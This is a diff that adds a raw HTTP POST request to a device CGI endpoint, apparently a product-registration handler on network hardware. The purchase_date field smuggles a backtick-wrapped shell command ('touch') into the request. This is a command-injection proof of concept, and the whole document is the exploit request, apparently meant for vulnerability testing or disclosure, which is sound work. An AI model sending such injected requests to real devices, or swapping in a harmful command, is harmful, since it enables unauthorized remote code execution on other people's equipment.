@@ -1,0 +1,5 @@
+POST /bd_genie_prodcut_register.cgi HTTP/1.1
+Content-Type: application/json
+Content-Length: 47
+
+country=1&purchase_date='`touch aaa143399.txt`'
